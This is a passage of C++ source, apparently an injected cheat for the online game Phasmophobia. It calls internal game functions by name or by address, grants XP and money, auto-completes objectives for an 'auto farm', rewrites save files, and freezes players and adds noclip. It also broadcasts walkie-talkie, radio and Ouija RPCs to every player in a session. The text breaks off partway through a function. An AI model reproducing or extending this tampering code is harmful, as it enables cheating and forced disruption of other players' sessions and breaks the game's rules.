#include "pch.h"
#include "cheat.h"
#include "phasmo_helpers.h"
#include "phasmo_resolve.h"
#include "phasmo_offsets.h"
#include "phasmo_structs.h"
#include "global.h"
#include "logger.h"
#include "imgui.h"
#include <math.h>
#include <algorithm>
#include <cctype>
#include <cstring>
#include <string>
#include <unordered_map>
#include <unordered_set>
#include <vector>

// ══════════════════════════════════════════════════════════
//  MISC_FEATURES.CPP — Phasmophobia
//  Implémentation de toutes les features du cheat
// ══════════════════════════════════════════════════════════

namespace Cheat
{
#define RUN_FEATURE_SAFE(tag, call)                                                     \
    do {                                                                                \
        __try {                                                                         \
            call;                                                                       \
        }                                                                               \
        __except (EXCEPTION_EXECUTE_HANDLER) {                                          \
            Logger::WriteLine("[Phasmo] SEH exception in %s", tag);                     \
        }                                                                               \
    } while (0)

    // ─── Cached local player pointer ────────────────────
    static Phasmo::Player* s_localPlayer = nullptr;
    static bool s_lastInGameFrame = false;
    static ULONGLONG s_inGameEnteredAtMs = 0;
    static bool s_disableGhostProfileForSession = false;
    struct Il2CppListPlayer
        : Phasmo::Il2CppObject
    {
        void* _items;    // 0x10
        int32_t _size;   // 0x18
        int32_t _version;// 0x1C
        void* _syncRoot; // 0x20
    };
    struct FrozenRecord
    {
        Phasmo::Player* player;
        Phasmo::Vec3 position;
        ULONGLONG nextNetworkSnapMs;
    };
    struct Quaternion
    {
        float x;
        float y;
        float z;
        float w;
    };

    static void* FindServerManager();
    static void* FindLevelSelectionManager();
    static void CompleteObjectivesNow(Phasmo::ObjectiveManager* manager, Phasmo::LevelValues* values);
    static void RefreshLobbyProfilesForSpot(Phasmo::NetworkPlayerSpot* spot, bool refreshAllIfNoMatch = true);
    static Phasmo::NetworkPlayerSpot* GetLocalNetworkSpot();
    static bool TryGetPlayerCharacterPosition(Phasmo::Player* player, Phasmo::Vec3& out);
    static Phasmo::PCPropGrab* GetPropGrab(Phasmo::Player* player);
    static UnityEngine_Camera_o* GetMainCamera();
    static void ProcessProfileSaveActions();
    static bool TrySetPhotonNickNameRaw(Il2CppString* newName);
    static void* TryGetPhotonLocalPlayerRaw();
    static bool TrySetPhotonPlayerNickNameRaw(void* localPhotonPlayer, Il2CppString* newName);
    static bool TrySetPhotonClientNickNameRaw(Il2CppString* newName);
    static std::vector<int32_t> GetEvidenceListValues(void* listPtr);
    static void RefreshStoreUi(bool refreshUpgradeStatus, const int* cashValue = nullptr);
    static Phasmo::PlayerAudio* GetLocalPlayerAudio();
    static Phasmo::WalkieTalkie* GetLocalWalkieTalkie();
    static Phasmo::TruckRadioController* GetTruckRadioController();
    static Phasmo::CCTVTruckTrigger* GetCCTVTruckTrigger();
    static Phasmo::PCDisablePlayerComponents* GetPcDisablePlayerComponents();
    static Phasmo::RewardManager* GetRewardManager();
    static Phasmo::ChallengesController* GetChallengesController();
    static bool TryWalkieRpc(const char* method);
    static bool TryTruckRadioRpc(int category, int clipIndex);
    static Photon_Pun_PhotonView_o* GetOuijaPhotonView(void* board);
    static bool TrySetOuijaMessage(const char* message, bool broadcast);
    static void ApplyCustomOuijaText();
    static Phasmo::PhotonObjectInteract** GetInteractListItems(void* listPtr, int32_t& outCount);
    static void ApplyAiriHeldCosmetics();
    static bool TrySingleplayerAddXpAndFunds(Phasmo::SingleplayerProfile* profile, int xpDelta, int cashDelta);
    static bool TryMultiplayerProfileUpdateUi(void* profile, bool refresh);
    static bool TrySaveCacheFile(Phasmo::SaveFileController* controller);
    static bool TrySaveGameSettings(Phasmo::SaveFileController* controller);
    static bool TryRequestRefreshManagers(Phasmo::ChallengesController* controller);
    static bool TryGhostOsUpdateMoneyUi(Phasmo::GhostOS* os);
    static bool TryStoreManagerUpdateUpgradeStatus(Phasmo::StoreManager* store);

    struct MaterialTintCacheEntry
    {
        Phasmo::Color originalColor;
        bool captured = false;
    };

    static std::unordered_map<void*, MaterialTintCacheEntry> s_airiTintCache;
    static void* s_airiLastHeldKey = nullptr;

    static void* GetUnityTypeObjectCached(const char* namespaze, const char* name)
    {
        if (void* typeObject = PhasmoResolve::GetUnityTypeObject("UnityEngine.AnimationModule", namespaze, name))
            return typeObject;
        if (void* typeObject = PhasmoResolve::GetUnityTypeObject("UnityEngine.CoreModule", namespaze, name))
            return typeObject;
        return PhasmoResolve::GetUnityTypeObject("Assembly-CSharp", namespaze, name);
    }

    static void* GetRendererTypeObject()
    {
        static void* typeObject = nullptr;
        if (!typeObject)
            typeObject = GetUnityTypeObjectCached("UnityEngine", "Renderer");
        return typeObject;
    }

    static void* GetMeshRendererTypeObject()
    {
        static void* typeObject = nullptr;
        if (!typeObject)
            typeObject = GetUnityTypeObjectCached("UnityEngine", "MeshRenderer");
        return typeObject;
    }

    static void* GetSkinnedMeshRendererTypeObject()
    {
        static void* typeObject = nullptr;
        if (!typeObject)
            typeObject = GetUnityTypeObjectCached("UnityEngine", "SkinnedMeshRenderer");
        return typeObject;
    }

    static void* GetGunTypeObject()
    {
        static void* typeObject = nullptr;
        if (!typeObject)
            typeObject = PhasmoResolve::GetUnityTypeObject("Assembly-CSharp", "", "Gun");
        return typeObject;
    }

    static void* GetEquipmentTypeObject()
    {
        static void* typeObject = nullptr;
        if (!typeObject)
            typeObject = PhasmoResolve::GetUnityTypeObject("Assembly-CSharp", "", "Equipment");
        return typeObject;
    }

    static void* TryGetRendererMaterial(void* renderer)
    {
        if (!renderer || !Phasmo_Safe(renderer, 0x40))
            return nullptr;

        using Fn = void* (*)(void*, const void*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("UnityEngine", "Renderer", "get_sharedMaterial", 0, "UnityEngine.CoreModule");

        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("UnityEngine", "Renderer", "get_material", 0, "UnityEngine.CoreModule");

        if (!fn)
            return nullptr;

        __try {
            return fn(renderer, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }
    }

    static bool TryGetMaterialColor(void* material, const char* propertyName, Phasmo::Color& out)
    {
        if (!material || !propertyName || !*propertyName)
            return false;

        using Fn = Phasmo::Color(*)(void*, Il2CppString*, const void*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("UnityEngine", "Material", "GetColor", 1, "UnityEngine.CoreModule");

        if (!fn)
            return false;

        Il2CppString* property = Phasmo_StringNew(propertyName);
        if (!property)
            return false;

        __try {
            out = fn(material, property, nullptr);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static bool TrySingleplayerAddXpAndFunds(Phasmo::SingleplayerProfile* profile, int xpDelta, int cashDelta)
    {
        if (!profile || !Phasmo_Safe(profile, sizeof(Phasmo::SingleplayerProfile)))
            return false;

        using Fn = void(*)(Phasmo::SingleplayerProfile*, int, int, const MethodInfo*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("", "SingleplayerProfile", "AddXPAndFunds", 2, "Assembly-CSharp");

        __try {
            if (fn) {
                fn(profile, xpDelta, cashDelta, nullptr);
                return true;
            }
            if (Phasmo::RVA_SingleplayerProfile_AddXPAndFunds) {
                Phasmo_Call<void>(Phasmo::RVA_SingleplayerProfile_AddXPAndFunds, profile, xpDelta, cashDelta, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    static bool TryMultiplayerProfileUpdateUi(void* profile, bool refresh)
    {
        if (!profile || !Phasmo_Safe(profile, 0xE0))
            return false;

        using Fn = void(*)(void*, bool, const MethodInfo*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("", "MultiplayerProfile", "UpdateUI", 1, "Assembly-CSharp");

        __try {
            if (fn) {
                fn(profile, refresh, nullptr);
                return true;
            }
            if (Phasmo::RVA_MultiplayerProfile_UpdateUI) {
                Phasmo_Call<void>(Phasmo::RVA_MultiplayerProfile_UpdateUI, profile, refresh, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    static bool TrySaveCacheFile(Phasmo::SaveFileController* controller)
    {
        if (!controller || !Phasmo_Safe(controller, sizeof(Phasmo::SaveFileController)))
            return false;

        using Fn = void* (*)(Phasmo::SaveFileController*, const MethodInfo*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("", "SaveFileController", "SaveCacheFile", 0, "Assembly-CSharp");

        __try {
            if (fn) {
                fn(controller, nullptr);
                return true;
            }
            if (Phasmo::RVA_SaveFileController_SaveCacheFile) {
                Phasmo_Call<void*>(Phasmo::RVA_SaveFileController_SaveCacheFile, controller, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    static bool TrySaveGameSettings(Phasmo::SaveFileController* controller)
    {
        if (!controller || !Phasmo_Safe(controller, sizeof(Phasmo::SaveFileController)))
            return false;

        using Fn = void(*)(Phasmo::SaveFileController*, const MethodInfo*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("", "SaveFileController", "SaveGameSettings", 0, "Assembly-CSharp");

        __try {
            if (fn) {
                fn(controller, nullptr);
                return true;
            }
            if (Phasmo::RVA_SaveFileController_SaveGameSettings) {
                Phasmo_Call<void>(Phasmo::RVA_SaveFileController_SaveGameSettings, controller, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    static bool TryRequestRefreshManagers(Phasmo::ChallengesController* controller)
    {
        if (!controller || !Phasmo_Safe(controller, sizeof(Phasmo::ChallengesController)))
            return false;

        using Fn = void(*)(Phasmo::ChallengesController*, const MethodInfo*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("", "ChallengesController", "RequestRefreshManagers", 0, "Assembly-CSharp");

        __try {
            if (fn) {
                fn(controller, nullptr);
                return true;
            }
            if (Phasmo::RVA_ChallengesController_RequestRefreshManagers) {
                Phasmo_Call<void>(Phasmo::RVA_ChallengesController_RequestRefreshManagers, controller, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    static bool TryGhostOsUpdateMoneyUi(Phasmo::GhostOS* os)
    {
        if (!os || !Phasmo_Safe(os, sizeof(Phasmo::GhostOS)))
            return false;

        using Fn = void(*)(Phasmo::GhostOS*, const MethodInfo*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("", "GhostOS", "UpdateMoneyUI", 0, "Assembly-CSharp");

        __try {
            if (fn) {
                fn(os, nullptr);
                return true;
            }
            if (Phasmo::RVA_GhostOS_UpdateMoneyUI) {
                Phasmo_Call<void>(Phasmo::RVA_GhostOS_UpdateMoneyUI, os, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    static bool TryStoreManagerUpdateUpgradeStatus(Phasmo::StoreManager* store)
    {
        if (!store || !Phasmo_Safe(store, sizeof(Phasmo::StoreManager)))
            return false;

        using Fn = void(*)(Phasmo::StoreManager*, const MethodInfo*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("", "StoreManager", "UpdateUpgradeStatus", 0, "Assembly-CSharp");

        __try {
            if (fn) {
                fn(store, nullptr);
                return true;
            }
            if (Phasmo::RVA_StoreManager_UpdateUpgradeStatus) {
                Phasmo_Call<void>(Phasmo::RVA_StoreManager_UpdateUpgradeStatus, store, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    static bool TrySetMaterialColor(void* material, const char* propertyName, const Phasmo::Color& color)
    {
        if (!material || !propertyName || !*propertyName)
            return false;

        using Fn = void (*)(void*, Il2CppString*, Phasmo::Color, const void*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("UnityEngine", "Material", "SetColor", 2, "UnityEngine.CoreModule");

        if (!fn)
            return false;

        Il2CppString* property = Phasmo_StringNew(propertyName);
        if (!property)
            return false;

        __try {
            fn(material, property, color, nullptr);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static void CaptureOriginalMaterialColor(void* material)
    {
        if (!material)
            return;

        auto& entry = s_airiTintCache[material];
        if (entry.captured)
            return;

        static const char* kColorProperties[] = { "_Color", "_BaseColor", "_EmissionColor" };
        for (const char* property : kColorProperties) {
            Phasmo::Color color{};
            if (TryGetMaterialColor(material, property, color)) {
                entry.originalColor = color;
                entry.captured = true;
                return;
            }
        }
    }

    static void ApplyMaterialTint(void* material, const Phasmo::Color& color)
    {
        if (!material)
            return;

        CaptureOriginalMaterialColor(material);
        TrySetMaterialColor(material, "_Color", color);
        TrySetMaterialColor(material, "_BaseColor", color);
        TrySetMaterialColor(material, "_EmissionColor", color);
    }

    static void RestoreAiriTintCache()
    {
        for (auto& it : s_airiTintCache) {
            if (!it.first || !it.second.captured)
                continue;

            TrySetMaterialColor(it.first, "_Color", it.second.originalColor);
            TrySetMaterialColor(it.first, "_BaseColor", it.second.originalColor);
            TrySetMaterialColor(it.first, "_EmissionColor", it.second.originalColor);
        }

        s_airiTintCache.clear();
    }

    static void ApplyTintToRenderer(void* renderer, const Phasmo::Color& color)
    {
        void* material = TryGetRendererMaterial(renderer);
        if (!material)
            return;

        ApplyMaterialTint(material, color);
    }

    static void ApplyTintToMaterialArray(Phasmo::Il2CppArray* materials, const Phasmo::Color& color)
    {
        if (!materials || !Phasmo_Safe(materials, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return;

        const int32_t count = materials->max_length;
        if (count <= 0 || count > 16)
            return;

        auto** items = reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(materials) + Phasmo::ARRAY_FIRST_ELEMENT);
        for (int32_t i = 0; i < count; ++i) {
            void* material = items[i];
            if (!material)
                continue;
            ApplyMaterialTint(material, color);
        }
    }

    static void ApplyTintToGunRenderers(Phasmo::Gun* gun, const Phasmo::Color& color)
    {
        if (!gun || !Phasmo_Safe(gun, sizeof(Phasmo::Gun)) || !gun->allRenderers)
            return;

        auto* renderers = gun->allRenderers;
        if (!Phasmo_Safe(renderers, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return;

        const int32_t count = renderers->max_length;
        if (count <= 0 || count > 32)
            return;

        auto** items = reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(renderers) + Phasmo::ARRAY_FIRST_ELEMENT);
        for (int32_t i = 0; i < count; ++i) {
            void* renderer = items[i];
            if (!renderer)
                continue;
            ApplyTintToRenderer(renderer, color);
        }
    }

    static void ApplyTintToRendererArray(Phasmo::Il2CppArray* renderers, const Phasmo::Color& color, int32_t maxCount = 32)
    {
        if (!renderers || !Phasmo_Safe(renderers, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return;

        const int32_t count = renderers->max_length;
        if (count <= 0 || count > maxCount)
            return;

        auto** items = reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(renderers) + Phasmo::ARRAY_FIRST_ELEMENT);
        for (int32_t i = 0; i < count; ++i) {
            void* renderer = items[i];
            if (!renderer)
                continue;
            ApplyTintToRenderer(renderer, color);
        }
    }

    static void ApplyTintToEquipmentRenderers(Phasmo::Equipment* equipment, const Phasmo::Color& color)
    {
        if (!equipment || !Phasmo_Safe(equipment, sizeof(Phasmo::Equipment)) || !equipment->renderers)
            return;

        ApplyTintToRendererArray(equipment->renderers, color);
    }

    static void ApplyTintToComponent(void* component, const Phasmo::Color& color)
    {
        if (!component || !Phasmo_Safe(component, 0x20))
            return;

        if (void* equipmentType = GetEquipmentTypeObject()) {
            void* equipmentObject = PhasmoResolve::GetComponent(component, equipmentType);
            if (!equipmentObject)
                equipmentObject = PhasmoResolve::GetComponentInChildren(component, equipmentType, true);
            if (equipmentObject)
                ApplyTintToEquipmentRenderers(reinterpret_cast<Phasmo::Equipment*>(equipmentObject), color);
        }

        if (void* gunType = GetGunTypeObject()) {
            void* gunObject = PhasmoResolve::GetComponent(component, gunType);
            if (!gunObject)
                gunObject = PhasmoResolve::GetComponentInChildren(component, gunType, true);
            if (gunObject)
                ApplyTintToGunRenderers(reinterpret_cast<Phasmo::Gun*>(gunObject), color);
        }

        if (void* meshRendererType = GetMeshRendererTypeObject()) {
            void* meshRenderer = PhasmoResolve::GetComponent(component, meshRendererType);
            if (!meshRenderer)
                meshRenderer = PhasmoResolve::GetComponentInChildren(component, meshRendererType, true);
            if (meshRenderer)
                ApplyTintToRenderer(meshRenderer, color);
        }

        if (void* skinnedRendererType = GetSkinnedMeshRendererTypeObject()) {
            void* skinnedRenderer = PhasmoResolve::GetComponent(component, skinnedRendererType);
            if (!skinnedRenderer)
                skinnedRenderer = PhasmoResolve::GetComponentInChildren(component, skinnedRendererType, true);
            if (skinnedRenderer)
                ApplyTintToRenderer(skinnedRenderer, color);
        }

        if (void* rendererType = GetRendererTypeObject()) {
            void* renderer = PhasmoResolve::GetComponent(component, rendererType);
            if (!renderer)
                renderer = PhasmoResolve::GetComponentInChildren(component, rendererType, true);
            if (renderer)
                ApplyTintToRenderer(renderer, color);
        }
    }

    static Phasmo::PhotonObjectInteract* GetCurrentHeldInteract(Phasmo::Player* player)
    {
        Phasmo::PCPropGrab* grab = GetPropGrab(player);
        if (!grab || !grab->isHolding)
            return nullptr;

        int32_t count = 0;
        Phasmo::PhotonObjectInteract** items = GetInteractListItems(grab->interactList, count);
        if (!items || count <= 0)
            return nullptr;

        const int32_t idx = grab->currentIndex;
        if (idx < 0 || idx >= count)
            return nullptr;

        Phasmo::PhotonObjectInteract* interact = items[idx];
        return (interact && Phasmo_Safe(interact, sizeof(Phasmo::PhotonObjectInteract))) ? interact : nullptr;
    }

    static void ApplyAiriHeldCosmetics()
    {
        if (!PLAYER_AiriHeldTint) {
            s_airiLastHeldKey = nullptr;
            s_airiTintCache.clear();
            return;
        }

        if (!s_localPlayer || !Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player)))
            return;

        __try {
            const Phasmo::Color color = {
                PLAYER_AiriTintColor[0],
                PLAYER_AiriTintColor[1],
                PLAYER_AiriTintColor[2],
                0.28f
            };

            Phasmo::PhotonObjectInteract* held = GetCurrentHeldInteract(s_localPlayer);
            void* heldKey = held ? reinterpret_cast<void*>(held) : nullptr;

            if (heldKey != s_airiLastHeldKey) {
                s_airiLastHeldKey = heldKey;

                if (held && Phasmo_Safe(held, sizeof(Phasmo::PhotonObjectInteract))) {
                    ApplyTintToComponent(held, color);
                    if (held->transform && Phasmo_Safe(held->transform, 0x20))
                        ApplyTintToComponent(held->transform, color);
                }

                if (Phasmo::PCPropGrab* grab = GetPropGrab(s_localPlayer)) {
                    if (grab->heldTransform && Phasmo_Safe(grab->heldTransform, 0x20))
                        ApplyTintToComponent(grab->heldTransform, color);
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            PLAYER_AiriHeldTint = false;
            s_airiLastHeldKey = nullptr;
            s_airiTintCache.clear();
        }
    }

    static void* TryGetCurrentPhotonRoomRaw()
    {
        __try { return Phasmo_Call<void*>(Phasmo::RVA_PN_GetCurrentRoom, nullptr); }
        __except (EXCEPTION_EXECUTE_HANDLER) { return nullptr; }
    }

    static Il2CppString* TryGetPhotonRoomNameRaw(void* room)
    {
        __try { return Phasmo_Call<Il2CppString*>(Phasmo::RVA_PR_GetName, room, nullptr); }
        __except (EXCEPTION_EXECUTE_HANDLER) { return nullptr; }
    }

    static bool TryGetPhotonStateRaw(bool& connected, bool& ready, bool& inRoom, bool& masterClient)
    {
        connected = false;
        ready = false;
        inRoom = false;
        masterClient = false;

        __try {
            connected = Phasmo_Call<bool>(Phasmo::RVA_PN_IsConnected);
            ready = Phasmo_Call<bool>(Phasmo::RVA_PN_IsConnectedAndReady);
            inRoom = Phasmo_Call<bool>(Phasmo::RVA_PN_GetInRoom);
            masterClient = Phasmo_Call<bool>(Phasmo::RVA_PN_GetIsMasterClient);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static bool TryApplyAutoFarmRoundFinishRaw()
    {
        __try {
            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            Phasmo::ObjectiveManager* manager = Phasmo_GetObjectiveManager();
            if (values && values->currentDifficulty) {
                values->currentDifficulty->evidenceGiven = std::max(values->currentDifficulty->evidenceGiven, 3);
                values->currentDifficulty->overrideMultiplier =
                    std::max(values->currentDifficulty->overrideMultiplier, 1.0f);
            }
            if (manager && values)
                CompleteObjectivesNow(manager, values);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static float V3Length(const Phasmo::Vec3& v)
    {
        return sqrtf(v.x * v.x + v.y * v.y + v.z * v.z);
    }

    static Phasmo::Vec3 V3Add(const Phasmo::Vec3& a, const Phasmo::Vec3& b)
    {
        return { a.x + b.x, a.y + b.y, a.z + b.z };
    }

    static Phasmo::Vec3 V3Sub(const Phasmo::Vec3& a, const Phasmo::Vec3& b)
    {
        return { a.x - b.x, a.y - b.y, a.z - b.z };
    }

    static Phasmo::Vec3 V3Scale(const Phasmo::Vec3& v, float scale)
    {
        return { v.x * scale, v.y * scale, v.z * scale };
    }

    static Phasmo::Vec3 V3Normalized(const Phasmo::Vec3& v)
    {
        float len = V3Length(v);
        if (len <= 0.0001f)
            return { 0.0f, 0.0f, 0.0f };
        return V3Scale(v, 1.0f / len);
    }

    static bool ReadTransformRotation(void* transform, Quaternion& out)
    {
        if (!transform || !Phasmo_Safe(transform, 0x20))
            return false;

        using Fn = Quaternion(*)(void*, const void*);
        static Fn fn = nullptr;
        if (!fn)
            fn = Phasmo_ResolveMethod<Fn>("UnityEngine", "Transform", "get_rotation", 0, "UnityEngine.CoreModule");

        if (fn) {
            __try {
                out = fn(transform, nullptr);
                return true;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }

        if (!Phasmo_Safe(transform, Phasmo::TF_ROTATION + sizeof(Quaternion)))
            return false;

        out = *reinterpret_cast<Quaternion*>(
            reinterpret_cast<uint8_t*>(transform) + Phasmo::TF_ROTATION);
        return true;
    }

    static Phasmo::Vec3 QuaternionForward(const Quaternion& q)
    {
        return {
            2.0f * (q.x * q.z + q.w * q.y),
            2.0f * (q.y * q.z - q.w * q.x),
            1.0f - 2.0f * (q.x * q.x + q.y * q.y)
        };
    }

    static Phasmo::Vec3 QuaternionRight(const Quaternion& q)
    {
        return {
            1.0f - 2.0f * (q.y * q.y + q.z * q.z),
            2.0f * (q.x * q.y + q.w * q.z),
            2.0f * (q.x * q.z - q.w * q.y)
        };
    }

    static Phasmo::PlayerAudio* GetLocalPlayerAudio()
    {
        if (!s_localPlayer || !Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player)))
            return nullptr;

        auto* audio = reinterpret_cast<Phasmo::PlayerAudio*>(s_localPlayer->playerAudio);
        return Phasmo_Safe(audio, sizeof(Phasmo::PlayerAudio)) ? audio : nullptr;
    }

    static Phasmo::PlayerAudio* GetPlayerAudio(Phasmo::Player* player)
    {
        if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
            return nullptr;

        auto* audio = reinterpret_cast<Phasmo::PlayerAudio*>(player->playerAudio);
        return Phasmo_Safe(audio, sizeof(Phasmo::PlayerAudio)) ? audio : nullptr;
    }

    static Phasmo::WalkieTalkie* GetLocalWalkieTalkie()
    {
        Phasmo::PlayerAudio* audio = GetLocalPlayerAudio();
        if (!audio || !Phasmo_Safe(audio, sizeof(Phasmo::PlayerAudio)))
            return nullptr;

        auto* walkie = reinterpret_cast<Phasmo::WalkieTalkie*>(audio->walkieTalkie);
        return Phasmo_Safe(walkie, sizeof(Phasmo::WalkieTalkie)) ? walkie : nullptr;
    }

    static bool TryWalkieRpc(const char* method)
    {
        if (!method || !*method)
            return false;

        Phasmo::WalkieTalkie* walkie = GetLocalWalkieTalkie();
        if (!walkie || !walkie->view || !Phasmo_Safe(walkie->view, 0x40))
            return false;

        Il2CppString* methodName = Phasmo_StringNew(method);
        if (!methodName)
            return false;

        Phasmo_Call<void>(Phasmo::RVA_PV_RPC, walkie->view, methodName, Phasmo::RPC_ALL, nullptr, nullptr);
        return true;
    }

    static Phasmo::TruckRadioController* GetTruckRadioController()
    {
        return Phasmo_FindFirstObjectOfType<Phasmo::TruckRadioController>("", "TruckRadioController", "Assembly-CSharp");
    }

    static Phasmo::CCTVTruckTrigger* GetCCTVTruckTrigger()
    {
        return Phasmo_FindFirstObjectOfType<Phasmo::CCTVTruckTrigger>("", "CCTVTruckTrigger", "Assembly-CSharp");
    }

    static Phasmo::PCDisablePlayerComponents* GetPcDisablePlayerComponents()
    {
        return Phasmo_FindFirstObjectOfType<Phasmo::PCDisablePlayerComponents>("", "PCDisablePlayerComponents", "Assembly-CSharp");
    }

    static bool TryTruckRadioRpc(int category, int clipIndex)
    {
        Phasmo::TruckRadioController* controller = GetTruckRadioController();
        if (!controller || !controller->view || !Phasmo_Safe(controller->view, 0x40))
            return false;

        Il2CppString* methodName = Phasmo_StringNew("PlayAudioClip");
        Phasmo::Il2CppArray* args = Phasmo_NewObjectArray(2);
        Il2CppObject* boxedCategory = Phasmo_BoxInt32(category);
        Il2CppObject* boxedClipIndex = Phasmo_BoxInt32(clipIndex);
        if (!methodName || !args || !boxedCategory || !boxedClipIndex)
            return false;
        if (!Phasmo_ArraySetObject(args, 0, boxedCategory) ||
            !Phasmo_ArraySetObject(args, 1, boxedClipIndex))
            return false;

        Phasmo_Call<void>(Phasmo::RVA_PV_RPC, controller->view, methodName, Phasmo::RPC_ALL, args, nullptr);
        return true;
    }

    static float GetNoClipDeltaTime()
    {
        static LARGE_INTEGER last = {};
        static LARGE_INTEGER frequency = {};
        if (!frequency.QuadPart)
            QueryPerformanceFrequency(&frequency);

        LARGE_INTEGER now;
        QueryPerformanceCounter(&now);
        if (!last.QuadPart) {
            last = now;
            return 1.0f / 60.0f;
        }

        float delta = static_cast<float>(now.QuadPart - last.QuadPart) / static_cast<float>(frequency.QuadPart);
        last = now;
        return delta > 0.0f ? delta : (1.0f / 60.0f);
    }
    static std::vector<FrozenRecord> s_frozenPlayers;
    static Phasmo::LevelController* s_levelCtrl = nullptr;
    static bool s_loggedMissingLevelController = false;
    static ULONGLONG s_suspendUntilMs = 0;
    static bool s_lastInGameState = false;
    static bool s_completedObjectivesThisRound = false;
    static ULONGLONG s_rewardScreenPolishUntilMs = 0;
    static int s_rewardScreenCashBonus = 0;
    static int s_rewardScreenXpBonus = 0;
    static float s_rewardScreenMultiplier = 1.0f;
    static bool s_rewardScreenPerfectGame = false;
    static bool s_autoFarmLastInGame = false;
    static bool s_autoFarmLastInRoom = false;
    static bool s_autoFarmLastEnabled = false;
    static ULONGLONG s_autoFarmLobbyEnteredAtMs = 0;
    static ULONGLONG s_autoFarmRoundEnteredAtMs = 0;
    static ULONGLONG s_autoFarmLastRoundEndedAtMs = 0;
    static ULONGLONG s_autoFarmLastActionAtMs = 0;
    static ULONGLONG s_autoFarmLastRetryAtMs = 0;
    static bool s_autoFarmSelectedContractThisLobby = false;
    static std::string s_autoFarmLastRoomName;
    static bool EnsureLevelController(Phasmo::LevelController*& out);
    static bool EnsureLocalPlayer();
    static bool IsInGame();
    static void ApplyAutoFarm();

    static void SuspendFeaturesMs(ULONGLONG ms)
    {
        s_suspendUntilMs = GetTickCount64() + ms;
    }

    static bool IsSuspended()
    {
        if (!s_suspendUntilMs)
            return false;
        if (GetTickCount64() >= s_suspendUntilMs) {
            s_suspendUntilMs = 0;
            return false;
        }
        return true;
    }

    static const char* GhostStateName(int state)
    {
        switch (state)
        {
        case 0:  return "Idle";
        case 1:  return "Wander";
        case 2:  return "Hunting";
        case 3:  return "Favourite Room";
        case 4:  return "Light";
        case 5:  return "Door";
        case 6:  return "Throwing";
        case 7:  return "Fusebox";
        case 8:  return "Appear";
        case 9:  return "Door Knock";
        case 10: return "Window Knock";
        case 11: return "Car Alarm";
        case 12: return "Flicker";
        case 13: return "CCTV";
        case 14: return "Random Event";
        case 15: return "Ghost Ability";
        case 16: return "Mannequin";
        case 17: return "Teleport Object";
        case 18: return "Interact";
        case 19: return "Summoning Circle";
        case 20: return "Music Box";
        case 21: return "Dots";
        case 22: return "Salt";
        case 23: return "Ignite";
        default: return "Unknown";
        }
    }

    // Helper to refresh cached pointers
    static void RefreshCache()
    {
        EnsureLevelController(s_levelCtrl);
    }

    static void ClearCachedPointers()
    {
        s_localPlayer = nullptr;
        s_levelCtrl = nullptr;
        s_frozenPlayers.clear();
        s_loggedMissingLevelController = false;
    }

    static bool EnsureLevelController(Phasmo::LevelController*& out)
    {
        if (s_levelCtrl && !Phasmo_Safe(s_levelCtrl, sizeof(Phasmo::LevelController))) {
            s_levelCtrl = nullptr;
        }

        out = Phasmo_GetLevelController();
        if (out && Phasmo_Safe(out, sizeof(Phasmo::LevelController))) {
            s_levelCtrl = out;
        } else {
            out = s_levelCtrl;
        }

        out = s_levelCtrl;
        if (!out) {
            if (!s_loggedMissingLevelController) {
                Logger::WriteLine("[Phasmo] LevelController missing (likely lobby/menu)");
                s_loggedMissingLevelController = true;
            }
            return false;
        }

        s_loggedMissingLevelController = false;
        return true;
    }

    static bool RefreshLocalPlayer()
    {
        Phasmo::MapController* map = Phasmo_GetMapController();
        if (map && Phasmo_Safe(map, sizeof(Phasmo::MapController))) {
            void* listPtr = map->players;
            if (listPtr && Phasmo_Safe(listPtr, sizeof(Il2CppListPlayer))) {
                Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(listPtr);
